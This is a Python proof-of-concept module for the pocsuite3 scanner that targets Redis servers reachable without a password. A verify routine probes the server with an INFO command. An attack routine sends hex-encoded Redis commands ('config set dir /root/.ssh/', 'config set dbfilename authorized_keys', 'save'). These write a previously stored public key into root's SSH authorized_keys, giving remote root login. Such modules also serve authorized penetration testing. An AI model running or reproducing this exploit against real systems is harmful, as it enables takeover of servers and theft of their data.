"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

import socket
from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '89339'
    version = '3'
    author = ['seebug']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-12-09'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
        说明：“此版本通过生成公钥写入redis文件后直接运行此脚本可在服务器上/root/.ssh文件下生成公钥”
    '''
    samples = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.REDIS

    def _verify(self):
        result = {}
        payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option("rhost")
            port = self.getg_option("rport") or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and b'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Info'] = "Redis未授权访问"
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_verify(result)

    def _attack(self):
        result = {}
        payload = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x69\x72\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x73\x73\x68\x2f\x0d\x0a'
        payload2 = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x20\x22\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x5f\x6b\x65\x79\x73\x22\x0d\x0a'
        payload3 = b'\x73\x61\x76\x65\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option("rhost")
            port = self.getg_option("rport") or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata1 = s.recv(1024)
            s.send(payload2)
            recvdata2 = s.recv(1024)
            s.send(payload3)
            recvdata3 = s.recv(1024)
            if recvdata1 and b'+OK' in recvdata1:
                if recvdata2 and b'+OK' in recvdata2:
                    if recvdata3 and b'+OK' in recvdata3:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['Info'] = "Redis未授权访问EXP执行成功"
                        result['VerifyInfo']['URL'] = host
                        result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
